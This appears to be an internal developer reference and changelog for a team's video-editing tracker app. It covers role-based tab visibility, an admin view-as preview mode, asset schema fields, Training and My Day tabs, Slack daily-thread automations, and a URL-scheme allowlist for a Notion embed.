...
|---|---|---|---|---|
| **Visitor** | Neutral grey | 1 | Campaigns, Editing Calendar, Board, Reporting | Default for first sign-ins (was `viewer` — renamed 2026-09-13, `Fb.ensureUserDoc` now writes `role: 'visitor'`). Narrow read-only surface — an admin promotes them from the Config → Team panel. |
| **Editor** | Green | 3 | My Day + Campaigns + Notifications + Board + Cat Heads Review + Training + Weekly Log + Editing Calendar + Grading + Editing Style + Editor Stats (personal, gated by email) + Automations + Reporting + Content + Clips (everything except Config) | The internal video editors (Zidni, Sharm, Patty). Bumped to rank 3 so `roleAtLeast('admin')` passes — they can edit anything on the tabs they see, no admin-only gates block them. |
| **Cat Head** | Accent purple | 2 | Campaigns, Editing Calendar, Board, Cat Heads Review, Reporting | Category heads reviewing videos through the CH QC column. |
| **Content Lead** | Blue | 2 | Campaigns, Editing Calendar, Reporting, Editing Style | Cross-category content lead (view-heavy). |
| **Admin** | Accent purple | 3 | Every tab (My Day, Editor Stats with peer picker, plus destructive Config/Automations) | Founding admin owns Config / Automations / destructive controls. The bootstrap admin (`elsa@tilt.app`) can never be demoted. Admins also get the **View-as picker** (§3.5) and land on **My Day** on first sign-in (see below). |

**Legacy roles (`viewer`, `pm`)** are no longer selectable. `pm` is retained in `ROLE_RANK` at rank 2 so any lingering `roleAtLeast('pm')` gates (currently: Editing Style admin input) still evaluate correctly. Existing user docs still stamped `viewer` or `pm` fall through `tabsForRole()` to the visitor set (safe read-only default) and render as **Visitor** in the Config dropdown — Elsa can reclassify manually.

**Elsa (`elsa@tilt.app`) special cases** — email-based, not role-based:
- `renderTopbar` bounces her to **My Day** (`editorHome`) on first load post-deploy, guarded by an `_elsaMyDayLanded_v1` localStorage flag so her subsequent manual navigation sticks.
- She keeps her admin visibility of every tab; the landing only fires once per browser.
...
| Category Heads | **Anand** (Sneakers), **Hanyan** (TCG), **Nazy** (Stone Island, Vintage, Bags and Accessories, Y2K, Jewellery, Health and Beauty), **Cristian** (Luxury), **Jacob** (Streetwear) |
| Content Leads | **Millie** (UK Organic) |
| Admin | **Elsa** (bootstrap admin; auto-promoted on sign-in via `Fb.BOOTSTRAP_ADMIN_EMAILS`) |

Country PMs (UK/IT/ES/US) are still referenced via `COUNTRY_PMS` for Slack @-mentions on batched notifications (Elsa/UK, Gian/IT, Marcel/ES, US), but **`pm` is no longer a selectable role**. Auto-scheduling has been removed — asset assignment is manual (see §6.4).

### 3.3 First-sign-in default

New profiles land as **Visitor** (was `editor` until 2026-07-30, then `viewer` until 2026-09-13). `Fb.ensureUserDoc` writes `role: 'visitor'` on first upsert unless the email is in `BOOTSTRAP_ADMIN_EMAILS`. Admins promote from Config → Team panel — the dropdown saves immediately and the affected user's tabs update on their next render (no refresh needed).

### 3.5 View-as picker (admin-only)

Admins get a **View as** dropdown in the topbar user chip (`self` / `contentLead` / `catHead` / `editor` / `visitor`). Picking anything other than *self* shadows `Auth.user.role` with the chosen role via a `defineProperty` getter, so every existing role read (`roleAtLeast`, direct comparisons, render gates) sees the impersonated role while `_realRole` stays authoritative. The override is stored per-browser in `localStorage['_viewAsRole_v1']`, so it survives refresh but doesn't leak across devices — and if a demoted user's browser still has a stale override, the getter silently returns `_realRole` because only `_realRole === 'admin'` unlocks impersonation.

- Writes still hit Firestore under the admin's real identity — impersonation is display-only. A persistent amber banner pinned under the topbar reminds the admin nothing is real, with an **Exit view** button that clears the override.
- Impersonation only lets a real admin see the narrower matrix — it can't grant an editor visibility they wouldn't otherwise have.
- Editor-Stats / My Day fallbacks and the Clips leaderboard render sensible previews under view-as so the impersonated view isn't blank (e.g. Clips shows Sharm's real live card as a stand-in when the admin's own email isn't in the tagging squad).
...
| `contentLeadQc` | enum | Content Lead verdict (Organic-only equivalent of `categoryHeadQc`, reuses the same value set). Added Batch B (2026-09-08). |
| `clQcDateApproved` | string (YYYY-MM-DD) | Stamped when `contentLeadQc` → Approved; cleared when it moves away. Feeds CL Home's "Approved today" tile. |
| `clQcDateRevisions` | string (YYYY-MM-DD) | Stamped when `contentLeadQc` → Needs Revisions. **Never cleared** — records "the CL sent it back today", not current state, so the "Sent for revisions today" tile stays truthful even if the editor re-flips to For Review later that day. Added 2026-09-15. |
...
| `scheduledFor` | string (YYYY-MM-DD) | Legacy — was stamped by the removed Scheduler tab. Still read as a display-date fallback for `estDelivery`; no live path writes it any more. |
| `released` | boolean | Legacy — was set when the removed Scheduler released a daily queue. Still filtered by `buildDailyQueueMessage` / `showExportModal` so pre-existing `released:true` assets stay excluded; no live path sets it any more. |
| `version` | number | Bumped on each mutation |
| `assignedAt` | timestamp | Set when an editor is assigned |
| `doneToday` | string (YYYY-MM-DD) | Set when the editor ticks "Worked on today" on My Day; cleared on untick. Filters into that day's EOD `Worked on today` list. |
| `hiddenFromMyDay` | boolean | Admin dismiss on My Day (§5.11). Soft-hides the row from the editor's My Day view only — asset stays live in Campaigns / Board / notifications. Non-destructive; restorable from the Show N dismissed panel. |
| `decisions` | array of `{note, at, by}` | Append-only creative-choice notes (Batch C surface, still on the schema). |
...
- `STATE.trainingCompletions{}` — keyed by editor email: `{ [moduleId]: { startedAt, completedAt, submissionUrls: [str,…], submissionAt: [iso,…], (legacy submissionUrl) } }`. `submissionAt[i]` is the submitted timestamp for video slot `i` (parallel to `submissionUrls`; empty for videos logged before 2026-09-23). Aliased emails (Sharm has `sharm` and `sharmaine`) merge on read via `_editorTrainingCompletions`.
- `STATE.activeTrainingModuleId` — the module selected in the Training sidebar. Per-user (in `PER_USER_UI_FIELDS`), cleared when that module is deleted.
- `STATE.eod{}` — keyed by editor name → date ISO → `{ assets: [snap], training: [{moduleId, title, state}], other: [{id, text}], submittedAt, slackChannelId, slackThreadTs, slackReplyUrl, postedBy }`. Frozen on submit.
- `STATE.editingStyleNotionUrl` — the shared Editing Style Notion embed URL (§5.10).
- `STATE.brollDailyGoal` — shared per-editor daily clip-tagging goal (default 200), configurable inline on the Clips leaderboard / Notifications card.
- `STATE.brollBulkSelection`, `STATE.brollTaggedFilter` (default `'untagged'`), `STATE.brollSelectedId`, seller/product/category/type filters — per-user Clips UI state.
...
- `STATE.organicDailyThread` — single shared thread for **UK Organic** traffic (Millie watches). Same shape. Not used for intl Organic.
- `STATE.organicDailyThreadHistory` — last 7 archived Organic thread URLs.
- `STATE.contentLeadDailyThreads` — legacy per-lead map, kept in the schema so old snapshots load cleanly. Any today-dated slot is auto-migrated into `organicDailyThread` on load; the sweep archives the stale entries at UK midnight.
...
### 5.3 Weekly Log *(renamed from "Daily Log" 2026-09-14 — the tab id is still `log`)*
...
The Scheduler tab has been removed. Editor and ETA assignment is done inline in the Campaigns table or via the Board Kanban. The remaining `schedulerDate` / `schedulerIncludeWeekends` state fields and their `App.setSchedulerDate` / `toggleWeekends` / `clearSchedule` / `releaseScheduled` / `scheduleAssignEditor` / `scheduleSetEta` handlers were deleted on 2026-09-12 (see §9.5). Asset `.scheduledFor` and `.released` stay on the schema — the former is still read as a display-date fallback for `estDelivery`, the latter is still filtered by the Notifications "Export daily queue" so historical `released:true` assets stay excluded.
...
### 5.10 Editing Style *(added 2026-09-12)*

A shared reference surface for the team's live editing-style Notion page. An admin (or anyone `roleAtLeast('pm')` — the retained rank gate) pastes the **published** notion.site URL into the input at the top; the page renders below in a sandboxed iframe via the shared `renderNotionEmbedTab()` helper. The URL is persisted in `STATE.editingStyleNotionUrl` and synced through the normal Firestore snapshot so every teammate sees the same page on next render. Non-editors see the embed with an "Open in Notion ↗" button but no input.

- **Scheme allowlist (security boundary)** — `isSafeEmbedUrl(url)` only accepts `http://` / `https://` URLs. Enforced at both the write side (`App.setEditingStyleUrl` toasts and rejects anything else) and the read side (`renderNotionEmbedTab` blanks the iframe/link if a legacy `javascript:` / `data:` / `vbscript:` URL is already in Firestore, and surfaces a red "stored URL was rejected" message so an admin can clear or replace it). Without this, a stored `javascript:` URL would execute in the parent origin — the iframe carries `sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-popups-to-escape-sandbox"` for the sake of Notion.
- **Notion caveat + inline warning** — only pages published via *Share → Publish → Publish to web* (notion.site URLs) can be iframed; private notion.so URLs are blocked by X-Frame-Options and render empty. When the stored URL matches `notion.so/`, the helper renders an **amber warning banner** above the iframe explaining the fix (*Share → Publish → Publish to web*) and prints a prominent **Open in Notion ↗** button in the toolbar so the page is still one click away when the frame blanks (added 2026-09-16).
- **Scroll wrapper** — the tab now wraps in a `overflow:auto; height:100%` container. Without it, `.main { overflow:hidden }` clipped the iframe + toolbar on short laptop screens with no way to reach the bottom of the page (fix landed 2026-09-16 same time as the Notion warning).
- **Tab position** — sits between **Grading** and **Editor Stats** in `DEFAULT_TAB_ORDER`. Existing users' saved `STATE.tabOrder` is patched at load by a splice migration in `renderTopbar` (mirrors the `editingCalendar` and `notifications` migrations) so everyone gets the intended adjacency, not the "appended to the end" fallback.
- **Role visibility** — visible to visitor, editor, contentLead, and admin (`ROLE_TAB_VISIBILITY`). Only `roleAtLeast('pm')` sees the input; the `canEdit` check fails **closed** if `roleAtLeast` isn't defined (previously fell open — see §9.5 · 2026-09-12).

### 5.11 My Day (Editor Home) *(added 2026-09-13, iterated through 2026-09-17)*

Per-editor daily surface for the three editors and Elsa. Renamed from "Editor Home" to **My Day** in the UI; the underlying tab id is still `editorHome` and the render entry point is `renderEditorHomeView()`. Landing tab for **Elsa** post-deploy (one-time via `_elsaMyDayLanded_v1` localStorage flag) and, via `DEFAULT_TAB_ORDER`, sits directly after Campaigns for every editor — a `renderTopbar` splice migration keeps that adjacency even for saved tab orders from before the tab existed.

Two audiences:

- **Editor** (Zidni / Sharm / Patty resolved via `emailToEditor`) — their own day. No picker; the view scopes to their own assets (`a.editor === self`).
- **Admin** (`_realRole === 'admin'`, meaning Elsa in practice) — their own day PLUS a **View as** picker at the top that flips into read-only preview mode for any of the three editors. A purple banner reminds them it's a preview; every write path is disabled while previewing (`interactionsDisabled`). The picker is admin-only — editors never see it.

Anyone else (catHead, contentLead, visitor) sees a 🚧 **Under Construction** card ("This tab is for editors and admins.") — a defense-in-depth gate at the top of `renderEditorHomeView`.

**Sections (top to bottom):**

1. **Editing tasks · N active [· N approved today]** — one card per asset assigned to the editor whose status is neither Approved nor Cancelled, plus that day's own approvals (`a.dateApproved === today`) folded in as terminal ✓ chips so wins for the day stay visible. Sort: not-ticked first, then soonest ETA first, no-ETA last, tiebroken by most-recent `assignedAt`. Each row shows:
   - a **Worked on today** checkbox (writes `a.doneToday = todayUK()`; unticks clear it),
   - the video name — clickable, jumps to the row on Campaigns with a purple flash via `App.jumpToAsset` (added 2026-09-16),
   - meta pills: campaign · category · status badge · ETA chip (amber-tinted "Overdue" or teal-tinted "Today" as applicable),
   - an admin-only `×` **dismiss** button — soft-hides the row from My Day only (`a.hiddenFromMyDay = true`), non-destructive: the asset stays live in Campaigns / Board / notifications, only Home hides it (added 2026-09-16).
   Overdue rows get an amber left-border; already-ticked-today rows dim + drop to the bottom.

2. **Show N dismissed** panel (admin, when any exist) — a session-only chevron that reveals dismissed rows with an **↺ Restore** button per row. Toggle state (`_showDismissedMyDay`) is not persisted — a page reload collapses it again.

3. **Training queue** — Sharm and Patty only (`TRAINING_QUEUE_EDITORS = ['Sharm', 'Patty']`). Every training module renders as a compact row (open ones on top, completed ones dimmed at the bottom), with Brief / GDrive / Assets links plus an **Open in Training →** deep-link. Read-only during preview mode. Zidni and Elsa don't see this section (senior editors — the queue is aimed at the junior editors' downtime).

4. **End of day** panel — auto-filling submission surface, one bucket per (editor, UK-date) at `STATE.eod[editor][date]`:
   - **Worked on today (N)** — auto-populated from every asset the editor ticked *or* got approved today.
   - **Training (N)** — every training module the editor **started or completed today**, showing state (Started / Completed) beside the title. Included in the Slack post and the submission snapshot (added 2026-09-17).
   - **Other** — free-text list; add via input + Enter or "+ Add", remove per row with ×.
   - **Submit EOD** button — enabled once *anything* is populated (worked-on, training, or Other). Posts as a **reply in the editor's Slack daily thread** — auto-creating today's slot via the `postDailyThreadForEditor` Cloud Function if the 9am cron hasn't run yet — with an **@Elsa mention at the top** so Elsa gets pinged on every submission (reverted to daily-thread reply after a brief experiment posting top-level in the editor's channel — see §9.5 · 2026-09-17). Locks the day: the snapshot freezes into `eod[editor][date] = { assets, training, other, submittedAt, slackChannelId, slackThreadTs, slackReplyUrl }`, the whole panel switches to a locked read-only summary with a *View Slack reply ↗* link, and inputs disable until the next UK day rolls over.

### 5.12 Training *(added 2026-09-13 Batch E, restyled 2026-09-14 → 2026-09-15, Campaigns layout 2026-09-22, per-video rows 2026-09-23)*

Editors self-pick briefs when idle. Each module has a title + description, a **Task Brief** (Notion) link, a **GDrive** walkthrough link (was named `loomUrl` — the field key is preserved for back-compat; the label reads "GDrive"), an optional **Assets** (raw footage) link, and a `requiredSubmissions` count (default 1, max 20). Data lives in `STATE.trainingModules[]` (persisted in the main snapshot doc) and `STATE.trainingCompletions[<email>][<moduleId>] = { startedAt, completedAt, submissionUrls: [], submissionAt: [] }`.

- **Layout (mirrors Campaigns, 2026-09-22)** — left `.sidebar` lists every module with at least one content link (admin/CL badge = `N/M` editors completed; editor badge = ✓ / • / ○). Admins get a `+` in the sidebar header to add a module. The main pane reuses Campaigns markup: breadcrumb (`Training / Module #n`) → title row → brief → `.meta-chip` row (**videos N**, completed N/4, in progress, req, plus brief / gdrive / assets link pills) → table → inline Drive `<iframe>` embeds (via `driveEmbedUrl()`; folder links stay as pills because Drive can't embed folders). Admin/CL title-row actions: **→ Send to all threads**, **Copy message**, and (admin) **Edit** / **Delete**.
- **One row per video (2026-09-23)** — the table columns are **Editor · Status · Video · Submitted · Actions**. Every submitted training video is its own row (`Video #n` link + host, submitted date), grouped by editor; the editor name, status (Not started / In progress / ✓ Completed + `n/required videos`) and action cells span the group via `rowspan`. Editors can log **more videos than required** (e.g. 3/2) — a blank **"+ Add video"** entry row always sits at the bottom of the group and fills the first empty slot, else appends a new one. Removing a video leaves its slot empty so other videos keep their numbers.
- **Submitted dates** — `submissionAt[i]` is stamped when a video is first added, kept when its link is edited, and cleared when it's removed. Dates render as the UK calendar day (`BIZ_TZ`). Videos logged before this change show "—".
- **Editor view** — only the editor's own group (`You (<name>)`): ✎ edit / × remove on each video, the "+ Add video" row, and a **▶ Start / ✓ Mark complete / Undo** pill. Dates are read-only. A new or changed link auto-starts the module and posts a `🎬 <Editor> submitted training` reply in the editor's daily Slack thread (no thread today → skipped, logged). Legacy single-string `submissionUrl` is promoted into slot 0 on read.
- **Admin view (fully editable, 2026-09-23)** — every editor's group (Zidni / Sharm / Patty / Elsa, resolved through `EDITOR_EMAILS` aliases) is editable: edit / remove / add video links, change each video's submitted date (`<input type=date>` → `App.trainingSetSubmissionDate`), and Start / Mark complete / Undo — plus the per-editor **→ Slack** button (`sendTrainingToEditor`). Handlers take an optional trailing `targetEmail`, routed through `trainingTargetEmail()`; writes land on whichever alias already holds that editor's record (so Sharm's edits hit `sharmaine@` if that's where her data is). Admin edits on another editor's behalf **don't** post the Slack "submitted" ping.
- **Permission rule** — cross-editor writes check `Auth.user.role === 'admin'` explicitly, **not** `roleAtLeast('admin')`, because editors sit at rank 3 and pass `roleAtLeast('admin')` (§3). Without this an editor could edit another editor's row.
- **Content Lead view** — the same full-team table, read-only (links + dates, "No videos yet" placeholder for empty editors), with Send / Copy and per-editor → Slack.
- **Role visibility** — `training` is in the editor + admin sets. Config → Training modules panel remains admin-only for CRUD.
- **My Day integration** — see §5.11: Sharm and Patty get the Training queue section; every editor's EOD panel automatically includes any modules they started or completed today.
...
- One **daily thread URL** per editor (Zidni / Sharm / Patty / Elsa), per category head (Sneakers, TCG, etc.), a single **shared Organic (UK) thread** watched by Millie, and a single **shared International thread** for IT/ES/US traffic. URLs are parsed for `channelId` + `threadTs` at save time.
...
- **Scheduled auto-post at 09:00 Europe/London, Mon–Fri** (`postDailyThreadsScheduled` Cloud Function, added 2026-09-15): fans out through `editorSlackChannels`, calls the shared `postDailyThreadForEditorCore` for each editor with a channel configured, and stamps `dailyThreads[editor]` on Firestore with the new `channelId` + `threadTs` + canonical Slack permalink. The message body is now the plain `@editor - 15 Sep 2026` shape (mentions their Slack member ID when known). An **admin "Post now" button** exposes the same core function as a manual test / recovery lever via the `postDailyThreadForEditor` callable — idempotent: if today's slot is already set, the function no-ops. On EOD submission, `ensureDailyThreadForEditor` runs the same callable so a missed cron doesn't block submissions.
...
- **"Clear" respects a grace window** — clicking Clear on Automations sets a per-slot `_recentlyCleared*` guard so a stale-in-flight Firestore snapshot arriving within the next few seconds can't restore the just-cleared thread. Introduced 2026-09-15.
...
**Intl auto-thread on new asset (added 2026-09-16).** When a new asset is created on an IT/ES/US campaign, `notifyNewIntlAssetIfApplicable` fires an out-of-band ping into the shared intl thread. Runs independently of the batched notification path (which only reacts to status changes), so Elsa gets a heads-up the moment a Draft intl row appears. If today's intl thread isn't set, `ensureIntlThreadForToday` posts a top-level opener (`🌍 International videos — <date>` + Elsa mention) into the intl channel — derived from `STATE.intlDailyThread.channelId` when known, or by parsing the most recent history entry — and saves the returned message ts as the new intl thread slot. Subsequent intl adds that day reply to the same thread with a flag + name + status + editor line. An in-flight guard (`_intlThreadCreationInFlight`) keeps parallel adds from opening a second opener on the same tab. When no channel is derivable, a `skipped-notify` line goes into the activity log and the ping is dropped (admin needs to paste an intl thread URL once to seed the channel id). Deliberately routes around per-editor / category threads so Draft-stage intl videos surface earlier than the batch flow can react.
...
- **Strategy tab & CL Home removed (2026-09-17)**: Both landed in the Batch B–E sprint (see the 2026-09-13 roadmap entry below) and quickly proved to be dead weight for the roles that could see them. Strategy was a second copy of the Editing Style Notion-embed pattern (same helper, same iframe, different STATE key) that never got a URL pasted into it. CL Home had already been narrowed to admin-only on 2026-09-16, was stripped of every widget shortly after, then cut. Both tab ids (`strategy`, `clHome`), their render functions, App handlers, STATE fields (`strategyNotionUrl`, `clHomeYoursOpen` / `clHomeApprovedOpen` / `clHomeRevisionsOpen`), tab defs, DEFAULT_TAB_ORDER slots, and role-visibility rows have been deleted. `clQcDateApproved` and `clQcDateRevisions` stay on the asset — they were feeding the Approved-today / Sent-for-revisions-today tiles on CL Home but they're also the honest audit trail for the `contentLeadQc` transitions in the Grading tab tallies (Millie still work through Grading + Cat Heads Review). ~75 lines out.

- **Role visibility rebuild + Viewer→Visitor + PM dropped (2026-09-13)**: The role matrix had drifted — `viewer` was the read-only default, `pm` was a rarely-used middle tier, and every role saw a wider tab set than it needed. Rebuilt end-to-end in one commit (see §3.1). Renamed `viewer` → `visitor` (chip label, ROLE_TAB_VISIBILITY key, the three `|| 'viewer'` fallbacks, validation whitelist, `Fb.ensureUserDoc` default). Dropped `pm` as a selectable role — kept in `ROLE_RANK` at 2 so any lingering `roleAtLeast('pm')` gates (currently just the Editing Style admin input) still evaluate correctly, but not in `ROLE_TAB_VISIBILITY` / `ROLE_LABELS` / the Config Team dropdown / the `setUserRole` whitelist. Any Firestore user doc still stamped `viewer` or `pm` falls through `tabsForRole()` to the visitor set and renders as **Visitor** in Config — Elsa can reclassify manually. New `ALL_TABS_INTERNAL` master list (16 tab ids) that each role reads from; the old `ALL_TABS` global was kept as an alias for back-compat references. Also added: **Elsa lands on My Day** on first sign-in post-deploy via an `_elsaMyDayLanded_v1` localStorage flag so her subsequent navigation sticks. Her role is admin (not editor), so this bounce is email-based (`ELSA_EMAIL`), not role-based, and `tabsForRole` doesn't need a special case — admin already sees every tab.

- **Admin View-as picker (2026-09-13)**: Elsa needed a way to see what the app looks like as a Content Lead / Cat Head / editor / visitor without demoting herself. Added a `Auth.getViewAs()` / `setViewAs()` pair that stores an override role in `localStorage['_viewAsRole_v1']` per-browser (survives refresh, doesn't leak across devices), and a `defineProperty` shadow on `Auth.user.role` that returns the override when a real admin has one set and the real role otherwise. The setter writes to `_realRole` — so `Fb.subscribeMyProfile` and every other role write path still lands the real role authoritatively. Every existing role read (`roleAtLeast`, direct role comparisons, render gates) sees the shadowed role. Guarded so only `_realRole === 'admin'` actually returns an override — a demoted admin whose browser still has a stale `_viewAsRole_v1` entry can't escalate their view. Writes still go through with the real admin identity, so a persistent amber banner pinned under the topbar reminds her nothing is real, with an "Exit view" button. Editor-Stats + My Day + Clips leaderboard each have a small preview affordance so the impersonated view isn't blank when the admin's email doesn't map to a rostered editor. See §3.5 for the full flow.

- **EOD auto-fill, dismiss soft-hide, training-today, and daily-thread revert (2026-09-14 → 2026-09-17)**: A cluster of iterations on My Day (§5.11) after the first Batch C shape landed. In order:
  - **Auto-fill "Worked on today"** — the panel used to depend on the editor ticking every asset by hand. Now it auto-includes anything approved that day (`a.dateApproved === today` in `taggedToday`), so if a video wrapped without a tick it still lands in the EOD post.
  - **Admin dismiss (soft-hide)** — new `a.hiddenFromMyDay` flag flipped by an admin-only × button on active *and* approved-today rows. Non-destructive: the asset stays live everywhere else, only My Day hides it. Paired with a session-only **Show N dismissed** panel that reveals the dismissed rows with a **↺ Restore** button per row. Replaces an earlier confirm-dialog-based hard-cancel that Elsa asked for reversibility on.
  - **Training queue** — Sharm & Patty (senior-junior split — `TRAINING_QUEUE_EDITORS = ['Sharm', 'Patty']`) get an inline Training queue section on their Home so their downtime always has a next-thing. All modules render, completed ones dim + drop to the bottom, no more "link-required" filter. Also the EOD panel's `trainingTodayList` scans `STATE.trainingCompletions[<email>][<moduleId>]` for `startedAt` / `completedAt` normalized to today UK and appends every hit as a **Training** section in the preview, submission snapshot, and Slack post (2026-09-17).
  - **Task title jumps to Campaigns** — the video-name in each row is now an `App.jumpToAsset(campId, assetId)` link that switches tabs, scrolls the campaign into view, and pulse-flashes the row purple. Faster than opening Campaigns and finding the row by name.
  - **Dropped Approved section, terminal rows scoped to today** — the standalone "Approved this week" section was noise; approvals now appear inline in the tasks list as terminal ✓ chips (still today-scoped, so historical approvals don't creep in).
  - **EOD Slack post: revert to daily-thread reply** — briefly (bd07836, 2026-09-17) tried posting EOD as a **top-level** message into the editor's Slack channel with an @Elsa mention, on the theory that a top-level post is more visible than a thread reply. Reverted in the very next commit (2ed5745) — the daily thread is where the context sits, editors and Elsa both scroll it end-of-day, and a top-level post created two surfaces to track. The Slack copy still leads with **@Elsa** at the top so she gets pinged on every submission; the destination is back to a reply under the editor's daily thread. `formatEODSlackMessage` also gained a **Training (N)** section between "Worked on" and "Other" so any module the editor touched that day shows up in the post.
  - **My Day tab is editor + admin only** — earlier attempts were email-gated (Elsa only) or admin-gated (editors saw an Under Construction card). Final shape: `renderEditorHomeView` opens to `_realRole === 'admin' || _realRole === 'editor'`; anyone else sees the 🚧 card. The picker + × dismiss buttons stay admin-only.
  - **Weekly Log** rename — the Daily Log tab was renamed to **Weekly Log** in the tab defs to match how the team actually talks about it (the view has always been a week-at-a-time grid; the "Daily" label was legacy from the original per-day accountability sheet).

- **Clips tab hardening — tagger initials, seller from Paid Ads, tally leaderboard, focus preservation (2026-09-14 → 2026-09-15)**: A cluster of Clips-tab tweaks after Elsa reported parallel taggers accidentally stealing each other's tally numbers.
  - **Default filter = Untagged** — `STATE.brollTaggedFilter` defaults to `'untagged'` on fresh boot so two editors tagging in parallel don't touch each other's cards by default (any field write re-attributes `taggedBy`, moving the clip's tally slot).
  - **Tagger initials chip on every clip card** — a small av-coloured chip in the top-left of the thumbnail shows the initials of the editor who last tagged the clip, but *only when the viewer isn't that editor* (so an editor doesn't see their own initials on every card). Tooltip explains: *retagging will move this to your tally and out of theirs*. Encourages self-avoidance without a hard lock.
  - **Seller filter + seller picker sourced from Paid Ads campaign names** — `brollPaidCampaignSellers()` walks `STATE.campaigns` for Paid Ads campaigns, trims trailing digits (Kameleon Vintage 2 → Kameleon Vintage), skips month-bucket names (`Jan 2026`, `Aug - 2026`), applies an EXCLUDE map of known non-seller names (`UK Ads`, retargeting campaigns, livestream buckets, etc.), and dedupes case+whitespace-insensitively. The Clips filter dropdown, the tag-panel seller `<select>`, and the bulk-seller dropdown all read from this list. **Seller is now a closed `<select>`, not a type-or-pick input** — an editor can't accidentally create a phantom seller by typo (the old free-text `datalist` would silently persist "Kameleon Vintage 2" as a distinct seller from "Kameleon Vintage"). Legacy tags whose seller isn't in the Paid Ads list are kept as an extra option so opening the panel never silently drops one.
  - **Live tagging leaderboard strip on the Clips tab** (2026-09-15) — a compact `renderClipsTaggingLeaderboard()` block above the Done strip. Admin sees all three TAG_EDS (Zidni / Sharm / Patty) as cards with today's tally + progress bar vs `getBrollDailyGoal()`; editors see only their own row so it stays motivating without becoming a public race. Under **View-as editor**, admin previewers see Sharm's real live card as a stand-in. Re-renders on every broll subscription update.
  - **Product auto-learn + sanitize on every sync** — `syncBrollNow` now guards the auto-learn step and calls `sanitizeProducts` on every sync so a bad character in a clip's `product` field can't corrupt the `STATE.products` list.
  - **Search + Notes input focus preservation** — the search input at the top of Clips and the Notes textarea in the tag panel were losing focus on every render loop. Fix: gave both stable DOM ids so React's-style `render()` reconciles instead of replacing them (2026-09-15).
  - **Recognize `sharmaine@tilt.app` as Sharm** — the daily tally's `emailToEditor` was mapping the alias to null, dropping ~30 approvals/day from Sharm's tally. Added `'sharmaine'` to `EDITOR_EMAILS.Sharm`. Everything that reads editor completions (Training, Clips leaderboard, `_editorTrainingCompletions`) benefits.
  - **Editor tagging leaderboard visible to editors** — was admin-only during the first day; opened up so editors can watch their own row climb.
  - **`recognise-sharmaine`, `editors-see-own-row`, `product-sanitize`** — three small fixes committed together after the parallel-tagger fallout.

- **Editing Style / Strategy scroll wrapper + notion.so warning banner (2026-09-16)**: The shared `renderNotionEmbedTab()` helper was clipping under `.main { overflow:hidden }` on short laptop screens — the iframe was `min-height:520px`, the toolbar took another ~60px, and the tab had no wrapper of its own to scroll. Added a `<div style="height:100%;overflow:auto;">` wrapper so the tab scrolls when its content is taller than the viewport. Same helper also detects when the stored URL matches the `notion.so/` pattern (private workspace URL, not a published `notion.site` one) and renders an **amber warning banner** above the iframe with the exact fix — *Share → Publish → Publish to web*, then paste the `notion.site` URL — plus a prominent **Open in Notion ↗** button in the toolbar so the page is still one click away when Notion refuses to embed. Neither piece was a security regression (the `isSafeEmbedUrl` scheme allowlist still holds), just UX around a Notion quirk that used to leave the tab silently blank. Strategy is gone now (see 2026-09-17 above), but the helper still serves the Editing Style tab and any future embed-Notion surface.

- **Intl auto-thread on new asset add (2026-09-16)**: Elsa asked for a way to catch a Draft intl (IT/ES/US) row landing in the tracker before the batched status-change flow reacts to it — the shared intl thread had no way to hear about a video until its status flipped from Draft to Assigned/For Review. Wired `notifyNewIntlAssetIfApplicable` into the asset-create paths. When a new asset lands on an IT/ES/US campaign, the function calls `ensureIntlThreadForToday` — which resolves today's `STATE.intlDailyThread` if set, or auto-creates one by posting a top-level `🌍 International videos — <date>` opener into the intl channel (channel id derived from `STATE.intlDailyThread.channelId` if any date matches, or by parsing the most recent `intlDailyThreadHistory` URL) with an Elsa mention — then posts a reply into the thread describing the new row (flag + name + campaign + country + status + editor). Fire-and-forget: errors log to the activity log but never fail the add. In-flight guard (`_intlThreadCreationInFlight`) keeps parallel adds from opening a second opener on the same tab. Cross-tab races are still possible but self-correcting — whichever tab wins the `saveState` round-trip becomes the canonical thread; the loser's opener sits as an orphan top-level message.

- **Daily editor threads: cron scheduler + admin Post-now + message-format change (2026-09-15)**: The three editor daily threads had to be posted by hand every morning — someone had to remember to paste the opener into each editor's channel, and if they forgot, the whole batched-notifications path fell back to a webhook broadcast to the main channel. New `postDailyThreadsScheduled` Cloud Function (cron `0 9 * * 1-5` Europe/London) fans out through `STATE.editorSlackChannels` and calls the shared `postDailyThreadForEditorCore(editor)` for each editor with a channel URL. The core: extracts the channel id from the stored URL, checks Firestore `dailyThreads[editor]` for today's slot (idempotency — if it's already set the function no-ops), posts `<@Uxxxx> - 15 Sep 2026` (or `@Zidni - …` fallback when no Slack member ID is known) into the channel via `chat.postMessage`, calls `getPermalink` for the canonical URL, and writes the slot back to Firestore via a `merge: true` update so the client's snapshot listener picks it up. Also exposed as `postDailyThreadForEditor` callable so an admin can hit **Post now** for one editor from Automations (used when the cron misses, or during manual testing). EOD submission (§5.11) uses the same callable via `ensureDailyThreadForEditor` so a missing thread never blocks the submit. **Message format changed** from a longer templated opener with a "your videos today" line to the plain `@editor - <date>` shape editors prefer — quieter, gets to the reply-target purpose faster. Two related fixes on the same day: **"Clear" click respects a recent-clear grace window** (`Fb._recentlyClearedIntlThread` + siblings) so a stale-in-flight snapshot arriving right after a Clear can't restore the just-cleared slot; and **midnight sweep** archives the previous day's slots into `dailyThreadHistory[editor]` capped at 7 entries as before.

- **Idle tab auto-reload on next teammate edit (2026-09-15)**: The cross-tab update pill (§2.2) was noisy for tabs left open unattended — someone who parked the tab at lunch and came back after four hours would land on a pill counter reading "9+ updates" that had accumulated silently in the background, with a Reload button they had to click to actually see fresh data. The pill was correct — data had synced via `onSnapshot`, only the render was stale — but the "reload to be sure" step still fell on the returning user. Added a soft auto-reload path: `showCrossTabUpdatePill` now checks `_lastInteractionAt` (already tracked from `mousedown`/`keydown`/`touchstart`/`scroll` + a throttled `mousemove`, plus `visibilitychange` resets on tab refocus) and, if the tab has been idle for **30 minutes+** (`_IDLE_AUTO_RELOAD_MS`) AND the user is not mid-edit (`_isBusyForIdleReload` guards on `.modal-overlay.open` and any focused `INPUT`/`TEXTAREA`/`contentEditable`), calls `reloadPreservingView()` instead of rendering the pill. Guarded by `_idleReloadScheduled` so a burst of edits from three teammates in one second still triggers exactly one reload. If the user IS mid-edit at the moment the trigger fires, the pill still renders as fallback and the idle-reload path will try again on the next teammate event once the modal closes. Actively-used tabs (any activity inside the 30-min window) never get auto-reloaded — the pill still surfaces normally so the human stays in control. Uses `reloadPreservingView` from the 2026-09-10 cross-tab pill work, so `STATE.tab` / `activeSubCampaignId` / 